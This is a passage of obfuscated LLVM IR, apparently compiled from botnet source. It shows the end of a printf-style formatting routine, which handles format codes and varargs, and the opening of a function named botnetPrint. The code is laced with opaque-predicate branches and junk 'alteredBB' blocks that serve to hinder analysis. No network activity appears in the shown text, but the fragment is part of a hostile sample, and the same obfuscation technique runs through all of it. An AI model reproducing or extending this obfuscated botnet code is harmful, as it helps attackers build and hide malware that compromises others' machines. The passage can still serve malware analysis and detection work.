  store i32 %231, i32* %207, align 8
  %232 = load i32, i32* @x.27
  %233 = load i32, i32* @y.28
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart257, label %originalBB44alteredBB

originalBBpart257:                                ; preds = %originalBB44
  br label %245

; <label>:240:                                    ; preds = %originalBBpart242
  %241 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 2
  %242 = load i8*, i8** %241, align 8
  %243 = bitcast i8* %242 to i64*
  %244 = getelementptr i8, i8* %242, i32 8
  store i8* %244, i8** %241, align 8
  br label %245

; <label>:245:                                    ; preds = %240, %originalBBpart257
  %246 = phi i64* [ %230, %originalBBpart257 ], [ %243, %240 ]
  %247 = load i32, i32* @x.27
  %248 = load i32, i32* @y.28
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %245
  %255 = load i64, i64* %246, align 8
  %256 = inttoptr i64 %255 to i8*
  store i8* %256, i8** %11, align 8
  %257 = load i8**, i8*** %4, align 8
  %258 = load i8*, i8** %11, align 8
  %259 = icmp ne i8* %258, null
  %260 = load i32, i32* @x.27
  %261 = load i32, i32* @y.28
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %259, label %268, label %286

; <label>:268:                                    ; preds = %originalBBpart261
  %269 = load i32, i32* @x.27
  %270 = load i32, i32* @y.28
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %268
  %277 = load i8*, i8** %11, align 8
  %278 = load i32, i32* @x.27
  %279 = load i32, i32* @y.28
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %287

; <label>:286:                                    ; preds = %originalBBpart261
  br label %287

; <label>:287:                                    ; preds = %286, %originalBBpart265
  %288 = phi i8* [ %277, %originalBBpart265 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.173, i32 0, i32 0), %286 ]
  %289 = load i32, i32* %7, align 4
  %290 = load i32, i32* %8, align 4
  %291 = call i32 @prints(i8** %257, i8* %288, i32 %289, i32 %290)
  %292 = load i32, i32* %9, align 4
  %293 = add nsw i32 %292, %291
  store i32 %293, i32* %9, align 4
  br label %618

; <label>:294:                                    ; preds = %192
  %295 = load i32, i32* @x.27
  %296 = load i32, i32* @y.28
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %294
  %303 = load i8*, i8** %5, align 8
  %304 = load i8, i8* %303, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp eq i32 %305, 100
  %307 = load i32, i32* @x.27
  %308 = load i32, i32* @y.28
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %306, label %315, label %356

; <label>:315:                                    ; preds = %originalBBpart269
  %316 = load i8**, i8*** %4, align 8
  %317 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %318 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 8
  %320 = icmp ule i32 %319, 40
  br i1 %320, label %321, label %327

; <label>:321:                                    ; preds = %315
  %322 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %317, i32 0, i32 3
  %323 = load i8*, i8** %322, align 8
  %324 = getelementptr i8, i8* %323, i32 %319
  %325 = bitcast i8* %324 to i32*
  %326 = add i32 %319, 8
  store i32 %326, i32* %318, align 8
  br label %348

; <label>:327:                                    ; preds = %315
  %328 = load i32, i32* @x.27
  %329 = load i32, i32* @y.28
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %327
  %336 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %317, i32 0, i32 2
  %337 = load i8*, i8** %336, align 8
  %338 = bitcast i8* %337 to i32*
  %339 = getelementptr i8, i8* %337, i32 8
  store i8* %339, i8** %336, align 8
  %340 = load i32, i32* @x.27
  %341 = load i32, i32* @y.28
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %348

; <label>:348:                                    ; preds = %originalBBpart273, %321
  %349 = phi i32* [ %325, %321 ], [ %338, %originalBBpart273 ]
  %350 = load i32, i32* %349, align 4
  %351 = load i32, i32* %7, align 4
  %352 = load i32, i32* %8, align 4
  %353 = call i32 @printi(i8** %316, i32 %350, i32 10, i32 1, i32 %351, i32 %352, i32 97)
  %354 = load i32, i32* %9, align 4
  %355 = add nsw i32 %354, %353
  store i32 %355, i32* %9, align 4
  br label %618

; <label>:356:                                    ; preds = %originalBBpart269
  %357 = load i32, i32* @x.27
  %358 = load i32, i32* @y.28
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %356
  %365 = load i8*, i8** %5, align 8
  %366 = load i8, i8* %365, align 1
  %367 = zext i8 %366 to i32
  %368 = icmp eq i32 %367, 120
  %369 = load i32, i32* @x.27
  %370 = load i32, i32* @y.28
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %368, label %377, label %402

; <label>:377:                                    ; preds = %originalBBpart277
  %378 = load i8**, i8*** %4, align 8
  %379 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %380 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %379, i32 0, i32 0
  %381 = load i32, i32* %380, align 8
  %382 = icmp ule i32 %381, 40
  br i1 %382, label %383, label %389

; <label>:383:                                    ; preds = %377
  %384 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %379, i32 0, i32 3
  %385 = load i8*, i8** %384, align 8
  %386 = getelementptr i8, i8* %385, i32 %381
  %387 = bitcast i8* %386 to i32*
  %388 = add i32 %381, 8
  store i32 %388, i32* %380, align 8
  br label %394

; <label>:389:                                    ; preds = %377
  %390 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %379, i32 0, i32 2
  %391 = load i8*, i8** %390, align 8
  %392 = bitcast i8* %391 to i32*
  %393 = getelementptr i8, i8* %391, i32 8
  store i8* %393, i8** %390, align 8
  br label %394

; <label>:394:                                    ; preds = %389, %383
  %395 = phi i32* [ %387, %383 ], [ %392, %389 ]
  %396 = load i32, i32* %395, align 4
  %397 = load i32, i32* %7, align 4
  %398 = load i32, i32* %8, align 4
  %399 = call i32 @printi(i8** %378, i32 %396, i32 16, i32 0, i32 %397, i32 %398, i32 97)
  %400 = load i32, i32* %9, align 4
  %401 = add nsw i32 %400, %399
  store i32 %401, i32* %9, align 4
  br label %618

; <label>:402:                                    ; preds = %originalBBpart277
  %403 = load i8*, i8** %5, align 8
  %404 = load i8, i8* %403, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 88
  br i1 %406, label %407, label %480

; <label>:407:                                    ; preds = %402
  %408 = load i8**, i8*** %4, align 8
  %409 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %410 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %409, i32 0, i32 0
  %411 = load i32, i32* %410, align 8
  %412 = icmp ule i32 %411, 40
  br i1 %412, label %413, label %435

; <label>:413:                                    ; preds = %407
  %414 = load i32, i32* @x.27
  %415 = load i32, i32* @y.28
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %413
  %422 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %409, i32 0, i32 3
  %423 = load i8*, i8** %422, align 8
  %424 = getelementptr i8, i8* %423, i32 %411
  %425 = bitcast i8* %424 to i32*
  %426 = add i32 %411, 8
  store i32 %426, i32* %410, align 8
  %427 = load i32, i32* @x.27
  %428 = load i32, i32* @y.28
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart287, label %originalBB79alteredBB

originalBBpart287:                                ; preds = %originalBB79
  br label %456

; <label>:435:                                    ; preds = %407
  %436 = load i32, i32* @x.27
  %437 = load i32, i32* @y.28
  %438 = sub i32 %436, 1
  %439 = mul i32 %436, %438
  %440 = urem i32 %439, 2
  %441 = icmp eq i32 %440, 0
  %442 = icmp slt i32 %437, 10
  %443 = or i1 %441, %442
  br i1 %443, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %435
  %444 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %409, i32 0, i32 2
  %445 = load i8*, i8** %444, align 8
  %446 = bitcast i8* %445 to i32*
  %447 = getelementptr i8, i8* %445, i32 8
  store i8* %447, i8** %444, align 8
  %448 = load i32, i32* @x.27
  %449 = load i32, i32* @y.28
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %456

; <label>:456:                                    ; preds = %originalBBpart291, %originalBBpart287
  %457 = phi i32* [ %425, %originalBBpart287 ], [ %446, %originalBBpart291 ]
  %458 = load i32, i32* @x.27
  %459 = load i32, i32* @y.28
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %456
  %466 = load i32, i32* %457, align 4
  %467 = load i32, i32* %7, align 4
  %468 = load i32, i32* %8, align 4
  %469 = call i32 @printi(i8** %408, i32 %466, i32 16, i32 0, i32 %467, i32 %468, i32 65)
  %470 = load i32, i32* %9, align 4
  %471 = add nsw i32 %470, %469
  store i32 %471, i32* %9, align 4
  %472 = load i32, i32* @x.27
  %473 = load i32, i32* @y.28
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart299, label %originalBB93alteredBB

originalBBpart299:                                ; preds = %originalBB93
  br label %618

; <label>:480:                                    ; preds = %402
  %481 = load i8*, i8** %5, align 8
  %482 = load i8, i8* %481, align 1
  %483 = zext i8 %482 to i32
  %484 = icmp eq i32 %483, 117
  br i1 %484, label %485, label %526

; <label>:485:                                    ; preds = %480
  %486 = load i32, i32* @x.27
  %487 = load i32, i32* @y.28
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %485
  %494 = load i8**, i8*** %4, align 8
  %495 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %496 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %495, i32 0, i32 0
  %497 = load i32, i32* %496, align 8
  %498 = icmp ule i32 %497, 40
  %499 = load i32, i32* @x.27
  %500 = load i32, i32* @y.28
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %498, label %507, label %513

; <label>:507:                                    ; preds = %originalBBpart2103
  %508 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %495, i32 0, i32 3
  %509 = load i8*, i8** %508, align 8
  %510 = getelementptr i8, i8* %509, i32 %497
  %511 = bitcast i8* %510 to i32*
  %512 = add i32 %497, 8
  store i32 %512, i32* %496, align 8
  br label %518

; <label>:513:                                    ; preds = %originalBBpart2103
  %514 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %495, i32 0, i32 2
  %515 = load i8*, i8** %514, align 8
  %516 = bitcast i8* %515 to i32*
  %517 = getelementptr i8, i8* %515, i32 8
  store i8* %517, i8** %514, align 8
  br label %518

; <label>:518:                                    ; preds = %513, %507
  %519 = phi i32* [ %511, %507 ], [ %516, %513 ]
  %520 = load i32, i32* %519, align 4
  %521 = load i32, i32* %7, align 4
  %522 = load i32, i32* %8, align 4
  %523 = call i32 @printi(i8** %494, i32 %520, i32 10, i32 0, i32 %521, i32 %522, i32 97)
  %524 = load i32, i32* %9, align 4
  %525 = add nsw i32 %524, %523
  store i32 %525, i32* %9, align 4
  br label %618

; <label>:526:                                    ; preds = %480
  %527 = load i8*, i8** %5, align 8
  %528 = load i8, i8* %527, align 1
  %529 = zext i8 %528 to i32
  %530 = icmp eq i32 %529, 99
  br i1 %530, label %531, label %592

; <label>:531:                                    ; preds = %526
  %532 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %533 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %532, i32 0, i32 0
  %534 = load i32, i32* %533, align 8
  %535 = icmp ule i32 %534, 40
  br i1 %535, label %536, label %542

; <label>:536:                                    ; preds = %531
  %537 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %532, i32 0, i32 3
  %538 = load i8*, i8** %537, align 8
  %539 = getelementptr i8, i8* %538, i32 %534
  %540 = bitcast i8* %539 to i32*
  %541 = add i32 %534, 8
  store i32 %541, i32* %533, align 8
  br label %563

; <label>:542:                                    ; preds = %531
  %543 = load i32, i32* @x.27
  %544 = load i32, i32* @y.28
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %542
  %551 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %532, i32 0, i32 2
  %552 = load i8*, i8** %551, align 8
  %553 = bitcast i8* %552 to i32*
  %554 = getelementptr i8, i8* %552, i32 8
  store i8* %554, i8** %551, align 8
  %555 = load i32, i32* @x.27
  %556 = load i32, i32* @y.28
  %557 = sub i32 %555, 1
  %558 = mul i32 %555, %557
  %559 = urem i32 %558, 2
  %560 = icmp eq i32 %559, 0
  %561 = icmp slt i32 %556, 10
  %562 = or i1 %560, %561
  br i1 %562, label %originalBBpart2107, label %originalBB105alteredBB

originalBBpart2107:                               ; preds = %originalBB105
  br label %563

; <label>:563:                                    ; preds = %originalBBpart2107, %536
  %564 = phi i32* [ %540, %536 ], [ %553, %originalBBpart2107 ]
  %565 = load i32, i32* @x.27
  %566 = load i32, i32* @y.28
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBB109, label %originalBB109alteredBB

originalBB109:                                    ; preds = %originalBB109alteredBB, %563
  %573 = load i32, i32* %564, align 4
  %574 = trunc i32 %573 to i8
  %575 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %574, i8* %575, align 1
  %576 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %576, align 1
  %577 = load i8**, i8*** %4, align 8
  %578 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %579 = load i32, i32* %7, align 4
  %580 = load i32, i32* %8, align 4
  %581 = call i32 @prints(i8** %577, i8* %578, i32 %579, i32 %580)
  %582 = load i32, i32* %9, align 4
  %583 = add nsw i32 %582, %581
  store i32 %583, i32* %9, align 4
  %584 = load i32, i32* @x.27
  %585 = load i32, i32* @y.28
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart2120, label %originalBB109alteredBB

originalBBpart2120:                               ; preds = %originalBB109
  br label %618

; <label>:592:                                    ; preds = %526
  br label %617

; <label>:593:                                    ; preds = %33
  %594 = load i32, i32* @x.27
  %595 = load i32, i32* @y.28
  %596 = sub i32 %594, 1
  %597 = mul i32 %594, %596
  %598 = urem i32 %597, 2
  %599 = icmp eq i32 %598, 0
  %600 = icmp slt i32 %595, 10
  %601 = or i1 %599, %600
  br i1 %601, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %593
  %602 = load i32, i32* @x.27
  %603 = load i32, i32* @y.28
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %610

; <label>:610:                                    ; preds = %originalBBpart2124, %83
  %611 = load i8**, i8*** %4, align 8
  %612 = load i8*, i8** %5, align 8
  %613 = load i8, i8* %612, align 1
  %614 = zext i8 %613 to i32
  call void @printchar(i8** %611, i32 %614)
  %615 = load i32, i32* %9, align 4
  %616 = add nsw i32 %615, 1
  store i32 %616, i32* %9, align 4
  br label %617

; <label>:617:                                    ; preds = %610, %592
  br label %618

; <label>:618:                                    ; preds = %617, %originalBBpart2120, %518, %originalBBpart299, %394, %348, %287
  %619 = load i8*, i8** %5, align 8
  %620 = getelementptr inbounds i8, i8* %619, i32 1
  store i8* %620, i8** %5, align 8
  br label %12

; <label>:621:                                    ; preds = %originalBBpart28, %originalBBpart2
  %622 = load i8**, i8*** %4, align 8
  %623 = icmp ne i8** %622, null
  br i1 %623, label %624, label %627

; <label>:624:                                    ; preds = %621
  %625 = load i8**, i8*** %4, align 8
  %626 = load i8*, i8** %625, align 8
  store i8 0, i8* %626, align 1
  br label %627

; <label>:627:                                    ; preds = %624, %621
  %628 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %629 = bitcast %struct.__va_list_tag* %628 to i8*
  call void @llvm.va_end(i8* %629)
  %630 = load i32, i32* %9, align 4
  ret i32 %630

originalBBalteredBB:                              ; preds = %originalBB, %12
  %631 = load i8*, i8** %5, align 8
  %632 = load i8, i8* %631, align 1
  %633 = zext i8 %632 to i32
  %634 = icmp ne i32 %633, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %635 = load i8*, i8** %5, align 8
  %636 = getelementptr inbounds i8, i8* %635, i32 1
  store i8* %636, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %637 = load i8*, i8** %5, align 8
  %638 = load i8, i8* %637, align 1
  %639 = zext i8 %638 to i32
  %640 = icmp eq i32 %639, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %84
  %641 = load i8*, i8** %5, align 8
  %642 = load i8, i8* %641, align 1
  %643 = zext i8 %642 to i32
  %644 = icmp eq i32 %643, 45
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %109
  %645 = load i8*, i8** %5, align 8
  %646 = load i8, i8* %645, align 1
  %647 = zext i8 %646 to i32
  %648 = icmp eq i32 %647, 48
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %141
  %649 = load i8*, i8** %5, align 8
  %650 = load i8, i8* %649, align 1
  %651 = zext i8 %650 to i32
  %652 = icmp sle i32 %651, 57
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %164
  %653 = load i32, i32* %7, align 4
  %_ = shl i32 %653, 10
  %654 = mul nsw i32 %653, 10
  store i32 %654, i32* %7, align 4
  %655 = load i8*, i8** %5, align 8
  %656 = load i8, i8* %655, align 1
  %657 = zext i8 %656 to i32
  %_23 = shl i32 %657, 48
  %_24 = shl i32 %657, 48
  %_25 = sub i32 %657, 48
  %gen = mul i32 %_25, 48
  %_26 = sub i32 0, %657
  %gen27 = add i32 %_26, 48
  %658 = sub nsw i32 %657, 48
  %659 = load i32, i32* %7, align 4
  %_28 = sub i32 %659, %658
  %gen29 = mul i32 %_28, %658
  %_30 = sub i32 %659, %658
  %gen31 = mul i32 %_30, %658
  %_32 = sub i32 %659, %658
  %gen33 = mul i32 %_32, %658
  %_34 = sub i32 0, %659
  %gen35 = add i32 %_34, %658
  %_36 = shl i32 %659, %658
  %660 = add nsw i32 %659, %658
  store i32 %660, i32* %7, align 4
  br label %originalBB22

originalBB40alteredBB:                            ; preds = %originalBB40, %197
  %661 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %662 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %661, i32 0, i32 0
  %663 = load i32, i32* %662, align 8
  %664 = icmp ule i32 %663, 40
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %218
  %665 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %206, i32 0, i32 3
  %666 = load i8*, i8** %665, align 8
  %667 = getelementptr i8, i8* %666, i32 %208
  %668 = bitcast i8* %667 to i64*
  %_45 = shl i32 %208, 8
  %_46 = sub i32 %208, 8
  %gen47 = mul i32 %_46, 8
  %_48 = sub i32 0, %208
  %gen49 = add i32 %_48, 8
  %_50 = sub i32 %208, 8
  %gen51 = mul i32 %_50, 8
  %_52 = sub i32 %208, 8
  %gen53 = mul i32 %_52, 8
  %_54 = sub i32 0, %208
  %gen55 = add i32 %_54, 8
  %669 = add i32 %208, 8
  store i32 %669, i32* %207, align 8
  br label %originalBB44

originalBB59alteredBB:                            ; preds = %originalBB59, %245
  %670 = load i64, i64* %246, align 8
  %671 = inttoptr i64 %670 to i8*
  store i8* %671, i8** %11, align 8
  %672 = load i8**, i8*** %4, align 8
  %673 = load i8*, i8** %11, align 8
  %674 = icmp ne i8* %673, null
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %268
  %675 = load i8*, i8** %11, align 8
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %294
  %676 = load i8*, i8** %5, align 8
  %677 = load i8, i8* %676, align 1
  %678 = zext i8 %677 to i32
  %679 = icmp eq i32 %678, 100
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %327
  %680 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %317, i32 0, i32 2
  %681 = load i8*, i8** %680, align 8
  %682 = bitcast i8* %681 to i32*
  %683 = getelementptr i8, i8* %681, i32 8
  store i8* %683, i8** %680, align 8
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %356
  %684 = load i8*, i8** %5, align 8
  %685 = load i8, i8* %684, align 1
  %686 = zext i8 %685 to i32
  %687 = icmp eq i32 %686, 120
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %413
  %688 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %409, i32 0, i32 3
  %689 = load i8*, i8** %688, align 8
  %690 = getelementptr i8, i8* %689, i32 %411
  %691 = bitcast i8* %690 to i32*
  %_80 = sub i32 0, %411
  %gen81 = add i32 %_80, 8
  %_82 = sub i32 0, %411
  %gen83 = add i32 %_82, 8
  %_84 = sub i32 0, %411
  %gen85 = add i32 %_84, 8
  %692 = add i32 %411, 8
  store i32 %692, i32* %410, align 8
  br label %originalBB79

originalBB89alteredBB:                            ; preds = %originalBB89, %435
  %693 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %409, i32 0, i32 2
  %694 = load i8*, i8** %693, align 8
  %695 = bitcast i8* %694 to i32*
  %696 = getelementptr i8, i8* %694, i32 8
  store i8* %696, i8** %693, align 8
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %456
  %697 = load i32, i32* %457, align 4
  %698 = load i32, i32* %7, align 4
  %699 = load i32, i32* %8, align 4
  %700 = call i32 @printi(i8** %408, i32 %697, i32 16, i32 0, i32 %698, i32 %699, i32 65)
  %701 = load i32, i32* %9, align 4
  %_94 = shl i32 %701, %700
  %_95 = sub i32 %701, %700
  %gen96 = mul i32 %_95, %700
  %_97 = shl i32 %701, %700
  %702 = add nsw i32 %701, %700
  store i32 %702, i32* %9, align 4
  br label %originalBB93

originalBB101alteredBB:                           ; preds = %originalBB101, %485
  %703 = load i8**, i8*** %4, align 8
  %704 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %705 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %704, i32 0, i32 0
  %706 = load i32, i32* %705, align 8
  %707 = icmp ule i32 %706, 40
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %542
  %708 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %532, i32 0, i32 2
  %709 = load i8*, i8** %708, align 8
  %710 = bitcast i8* %709 to i32*
  %711 = getelementptr i8, i8* %709, i32 8
  store i8* %711, i8** %708, align 8
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %563
  %712 = load i32, i32* %564, align 4
  %713 = trunc i32 %712 to i8
  %714 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %713, i8* %714, align 1
  %715 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %715, align 1
  %716 = load i8**, i8*** %4, align 8
  %717 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %718 = load i32, i32* %7, align 4
  %719 = load i32, i32* %8, align 4
  %720 = call i32 @prints(i8** %716, i8* %717, i32 %718, i32 %719)
  %721 = load i32, i32* %9, align 4
  %_110 = shl i32 %721, %720
  %_111 = sub i32 0, %721
  %gen112 = add i32 %_111, %720
  %_113 = sub i32 0, %721
  %gen114 = add i32 %_113, %720
  %_115 = sub i32 0, %721
  %gen116 = add i32 %_115, %720
  %_117 = sub i32 0, %721
  %gen118 = add i32 %_117, %720
  %722 = add nsw i32 %721, %720
  store i32 %722, i32* %9, align 4
  br label %originalBB109

originalBB122alteredBB:                           ; preds = %originalBB122, %593
  br label %originalBB122
}

; Function Attrs: noinline nounwind uwtable
define i32 @botnetPrint(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.29
  %4 = load i32, i32* @y.30
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
